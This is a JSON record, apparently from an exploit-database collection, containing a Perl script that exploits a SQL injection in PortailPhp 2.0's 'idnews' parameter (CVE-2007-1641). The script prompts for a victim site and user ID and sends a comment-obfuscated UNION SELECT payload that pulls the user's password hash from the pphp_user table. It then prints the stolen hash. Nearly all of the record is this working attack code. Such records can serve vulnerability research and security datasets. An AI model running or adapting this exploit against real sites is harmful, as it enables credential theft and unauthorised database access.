{
  "id": "3543",
  "title": "PortailPhp 2.0 - &#039;idnews&#039; SQL Injection",
  "cve": "CVE-2007-1641",
  "vuln_type": "sqli",
  "code": "use LWP::Simple;\r\nprint \"\r\nExploit Coded (c) by xoron\r\nPortail PHP v20 (index.php) Remote SQL Injection Exploit\r\nLanguages: Turkish, English\r\nPlz Select Language:\";\r\n$dil = <stdin>;\r\n%eng = (\r\n\"site\" => \"Enter The Victim Without http://:\",\r\n\"path\" => \"Plz Select Path:\",\r\n\"id\" => \"Plz Select User ID:\"\r\n);\r\n%turk = (\r\n\"site\" => \"Site Adi http:// ile baslayan:\",\r\n\"path\" => \"Dizin:\",\r\n\"id\" => \"ID: \"\r\n);\r\nif($dil=~/^turkish$/i){\r\n%dil = %turk;\r\n}\r\nelsif($dil=~/^english$/i){\r\n%dil = %eng;\r\n}\r\nelse{print \"Undefined Language\"; exit}\r\nprint $dil{site};\r\nchop($site=<stdin>);\r\n$site = \"http://$site\" if !($site=~/^http/);\r\nprint $dil{path};\r\nchop($dir=<stdin>);\r\n$dir = \"/portailphp/\" if !$dir;\r\nprint $dil{id};\r\nchop($id =<stdin>);\r\n$id = 2 if !$id;\r\nprint \"Connecting to $site\\n\";\r\n$sql = \"index.php?affiche=Comment&act=lire&idnews=-1/**/union/**/select/**/0,\";\r\n$sql .= \"1,2,US_pwd,4,5,6,7,8,9,10/**/from/**/pphp_user/**/where/**/US_uid=$id/*\";\r\n$get = get(\"$site$dir$sql\");\r\nif($get){\r\nif($get=~/<td><strong>\\&nbsp\\;\\&nbsp\\;(.*?)<\\/strong>/){\r\nprint \"You are very Lucky Boy\\nI Got Hash 4 ya\\nID: $id\\nHash: $1\";\r\nexit\r\n}\r\nelsif($get=~/<td><strong>(.*?)<\\/strong>/){\r\nprint \"Yep I got hash 4 ya\\nID: $id\\nHash: $1\\n\";\r\nexit;\r\n}\r\nelse{print \"Exploit Failed\\n\";exit}\r\n}\r\nprint \"Connect Failed to $site\\n\";\r\nexit;\r\n\r\n# milw0rm.com [2007-03-22]",
  "url": "https://www.exploit-db.com/exploits/3543"
}